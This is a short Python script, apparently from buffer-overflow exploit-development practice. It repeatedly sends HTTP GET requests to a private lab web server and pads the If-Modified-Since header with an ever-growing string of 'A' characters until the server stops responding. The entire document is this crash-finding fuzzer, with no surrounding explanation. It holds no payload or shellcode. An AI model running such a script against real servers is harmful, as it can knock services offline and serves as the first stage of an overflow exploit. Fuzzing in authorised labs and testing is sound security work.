#!/usr/bin/env python

import socket
import time

host = "192.168.122.152"
port = 80
numAs= 10

try:
    while True:
        buf = "GET / HTTP/1.1\r\n"
        buf += "User-Agent: Mozilla/4.0\r\n"
        buf += "Host: " + host + ":" + str(port) + "\r\n"
        buf += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buf += "Accept-Language: en-us\r\n"
        buf += "Accept-Encoding: gzip, deflate\r\n"
        buf += "Referer: http://" + host + "\r\n"
        buf += "If-Modified-Since: Mon, " + "A"*numAs + "\r\n"
        buf += "Connection: Keep-Alive\r\n\r\n"
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        print("[*] Sending " + str(numAs) + " As")
        s.send(buf)
        s.close()
        numAs += 10
        time.sleep(1)
except:
    print("Socket HTTP closed after sending " + str(numAs - 10) + "As")
